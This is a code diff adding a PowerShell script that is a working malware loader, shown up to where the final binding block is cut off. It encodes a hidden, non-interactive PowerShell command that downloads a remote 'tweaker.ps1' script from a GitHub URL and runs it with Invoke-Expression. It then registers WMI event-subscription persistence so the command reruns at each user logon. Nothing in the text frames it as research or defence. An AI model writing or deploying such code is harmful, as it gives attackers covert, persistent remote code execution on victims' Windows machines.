@@ -1,0 +1,27 @@
+$payloadUrl = "https://raw.githubusercontent.com/Blue15195/123/refs/heads/main/tweaker.ps1?token=GHSAT0AAAAAADCQQWHJ6B4UROFJL237Z6LS2AS5TUQ"
+
+$payload = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; " + `
+           "$down = New-Object System.Net.WebClient; " + `
+           "$script = $down.DownloadString('$payloadUrl'); " + `
+           "Invoke-Expression $script;"
+
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
+$encodedPayload = [Convert]::ToBase64String($bytes)
+
+$finalCommand = "powershell.exe -NoP -NonI -W Hidden -EncodedCommand $encodedPayload"
+
+$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ 
+    Name = 'WMI_LogonTrigger'
+    EventNamespace = 'root\cimv2'
+    QueryLanguage = 'WQL'
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_ComputerSystem' AND TargetInstance.UserName != NULL"
+}
+
+$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{ 
+    Name = 'WMI_MemoryLoader'
+    CommandLineTemplate = $finalCommand
+}
+
+Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ 
+    Filter = $filter
+    Consumer = $consumer
